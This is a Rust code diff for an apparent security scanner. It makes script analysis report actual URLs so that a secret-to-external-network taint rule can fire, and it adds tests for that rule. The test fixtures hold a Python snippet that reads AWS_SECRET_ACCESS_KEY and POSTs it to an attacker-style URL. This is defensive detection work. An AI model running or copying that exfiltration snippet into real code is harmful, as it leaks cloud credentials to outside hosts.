@@ -1,4 +1,5 @@
 use super::manifests::strip_inline_hash_comment;
+use super::network::extract_http_urls;
 use super::ArtifactLink;
 use crate::artifact_graph::{ArtifactCapability, ArtifactCapabilityFact, ArtifactRelation};
 use crate::detectors::patterns::{
@@ -497,7 +498,26 @@ pub(crate) fn script_relations(content: &str) -> Vec<ArtifactLink> {
             relation: ArtifactRelation::Persists,
         });
     }
-    if lower.contains("http://") || lower.contains("https://") || lower.contains("socket.") {
+    // Emit the actual matched URL(s) as the `ConnectsTo` target rather than a
+    // bare `"network"` placeholder. The taint sink classifier
+    // (`is_real_external_sink`) needs the URL to apply its registry /
+    // software-distribution / local / documentation-host carve-outs; a
+    // placeholder target matches none of them, so `endpoint_kind == None` plus
+    // `to == "network"` was classified as a NON-external sink — meaning the
+    // secret→external-network and identity→external-network taint rules could
+    // never fire on a script (e.g. `os.environ[...]` read + `requests.post`
+    // to an attacker URL). Raw-socket networking (`socket.`) has no URL to
+    // classify, so it keeps the placeholder: forcing it external would
+    // false-positive on the common local-socket case.
+    let url_targets = extract_http_urls(content);
+    let has_url_target = !url_targets.is_empty();
+    for url in url_targets {
+        links.push(ArtifactLink {
+            target: url,
+            relation: ArtifactRelation::ConnectsTo,
+        });
+    }
+    if !has_url_target && lower.contains("socket.") {
         links.push(ArtifactLink {
             target: "network".to_string(),
             relation: ArtifactRelation::ConnectsTo,
@@ -846,6 +866,66 @@ mod tests {
                 "{content:?} must produce an Executes edge",
             );
         }
+    }
+
+    /// # Contract
+    ///
+    /// A script that connects over HTTP(S) MUST emit the *actual matched
+    /// URL* as the `ConnectsTo` target, not a bare `"network"` placeholder.
+    /// The taint sink classifier keys on the URL to apply its registry /
+    /// software-distribution / local / documentation carve-outs; a
+    /// placeholder matches none of them and is classified as a non-external
+    /// sink, so the secret→external-network exfil rule could never fire on a
+    /// script (env-var secret read + `requests.post` to an attacker URL).
+    #[test]
+    fn http_connection_emits_actual_url_target_not_placeholder() {
+        let content = "import os, requests\n\
+            token = os.environ[\"AWS_SECRET_ACCESS_KEY\"]\n\
+            requests.post(\"https://attacker-controlled.io/exfil\", data={\"t\": token})\n";
+        let links = script_relations(content);
+        assert!(
+            links
+                .iter()
+                .any(|l| l.target == "https://attacker-controlled.io/exfil"
+                    && matches!(l.relation, ArtifactRelation::ConnectsTo)),
+            "the real URL must be the ConnectsTo target, got {links:?}"
+        );
+        assert!(
+            !relation_target_present(&links, "network"),
+            "a script with a real URL must not emit the bare `network` placeholder"
+        );
+    }
+
+    /// # Contract (end-to-end)
+    ///
+    /// The graph facts a script emits (secret source + external-URL sink)
+    /// MUST drive the `ARTIFACT_TAINT_SECRET_TO_EXTERNAL_NETWORK` rule. This
+    /// pins the integration the placeholder bug silently broke: a script
+    /// reading an env secret and POSTing it to an attacker URL is exfil.
+    #[test]
+    fn script_env_secret_to_external_url_fires_taint_rule() {
+        let content = "import os, requests\n\
+            token = os.environ[\"AWS_SECRET_ACCESS_KEY\"]\n\
+            requests.post(\"https://attacker-controlled.io/exfil\", data={\"t\": token})\n";
+
+        let mut graph = crate::artifact_graph::ArtifactGraph::new();
+        graph.add_node_with_capabilities(
+            "collect.py",
+            ArtifactKind::ReferencedArtifact,
+            script_capabilities(content),
+        );
+        for link in script_relations(content) {
+            graph.add_edge("collect.py", &link.target, link.relation);
+        }
+
+        let findings = crate::artifact_taint::derive_taint_findings(&graph, &[]);
+        assert!(
+            findings
+                .iter()
+                .any(|f| f.rule_id == "ARTIFACT_TAINT_SECRET_TO_EXTERNAL_NETWORK"),
+            "env-secret→external-URL script must fire the exfil taint rule, got: {:?}",
+            findings.iter().map(|f| &f.rule_id).collect::<Vec<_>>()
+        );
     }
 
     /// Contract: raw-socket networking (`socket.`) raises BOTH the
